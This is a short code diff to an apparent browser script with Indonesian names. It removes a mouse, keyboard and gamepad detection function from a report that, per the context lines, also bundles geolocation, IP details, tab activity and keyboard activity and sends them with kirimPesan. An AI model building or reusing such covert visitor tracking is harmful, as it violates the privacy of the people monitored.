@@ -536,19 +536,6 @@ Kombinasi Khusus      : ${kombinasiKhusus}
 `.trim();
 };
 
-const ambilPerangkatEksternal = () => {
-  const mouse = matchMedia('(pointer:fine)').matches ? 'Ya' : 'Tidak';
-  const keyboard = navigator.keyboard ? 'Ya' : 'Tidak';
-  const gamepad = navigator.getGamepads?.()[0] ? 'Ya' : 'Tidak';
-
-  return `
-౼ 〘 𝗗𝗘𝗧𝗘𝗞𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 𝗘𝗞𝗦𝗧𝗘𝗥𝗡𝗔𝗟 〙 ౼
-Mouse Terdeteksi      : ${mouse}
-Keyboard Eksternal    : ${keyboard}
-Gamepad Terhubung     : ${gamepad}
-`.trim();
-};
-
 const ambilLokasi = () => {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -629,7 +616,6 @@ const mulai = async () => {
   // Fitur tambahan
   const aktivitasTab = ambilAktivitasTab();
   const keyboard = ambilKeyboardActivity();
-  const perangkatEksternal = ambilPerangkatEksternal();
 
   const gabungAwal = [
     infoPerangkat,
@@ -641,7 +627,6 @@ const mulai = async () => {
     ipInfo,
     aktivitasTab,
     keyboard,
-    perangkatEksternal
   ].join("\n\n");
 
   await kirimPesan(gabungAwal);
